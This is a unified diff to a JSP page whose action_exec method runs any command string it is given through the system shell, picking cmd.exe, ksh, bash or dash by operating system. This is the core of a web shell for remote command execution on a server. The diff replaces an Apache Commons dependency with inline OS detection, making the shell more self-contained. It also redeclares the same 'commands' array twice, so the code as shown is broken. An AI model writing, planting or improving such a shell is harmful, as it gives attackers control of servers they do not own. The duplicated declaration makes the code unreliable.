@@ -1,7 +1,6 @@
 <%@ page import="java.util.*" %>
 <%@ page import="java.io.*" %>
 <%@ page import="org.json.*" %>
-<%@ page import="org.apache.commons.lang3.*" %>
 
 <%@ page contentType="application/json; charset=UTF-8" %>
 
@@ -13,16 +12,25 @@ private void action_exec(JspWriter writer, String cmd) throws IOException {
 
     String[] commands = {"/bin/bash", "-c", cmd};
 
-    if (SystemUtils.IS_OS_WINDOWS) {
+    String OS = System.getProperty("os.name").toLowerCase();
+    boolean IS_OS_WINDOWS = (OS.indexOf("win") >= 0);
+    boolean IS_OS_MAC = (OS.indexOf("mac") >= 0);
+    boolean IS_OS_LINUX = (OS.indexOf("nix") >= 0 || OS.indexOf("nux") >= 0);
+    boolean IS_OS_AIX = (OS.indexOf("aix") > 0);
+    boolean IS_SOLARIS = (OS.indexOf("sunos") >= 0);
+
+    String[] commands = {"/bin/bash", "-c", cmd};
+
+    if (IS_OS_WINDOWS) {
         commands[0] = "cmd.exe";
         commands[1] = "/c";
-    } else if (SystemUtils.IS_OS_AIX) {
+    } else if (IS_OS_AIX) {
         commands[0] = "/bin/ksh";
         commands[1] = "-c";
-    } else if (SystemUtils.IS_OS_LINUX) {
+    } else if (IS_OS_LINUX) {
         commands[0] = "/bin/bash";
         commands[1] = "-c";
-    } else if (SystemUtils.IS_OS_MAC) {
+    } else if (IS_OS_MAC) {
         commands[0] = "/bin/dash";
         commands[1] = "-c";
     }
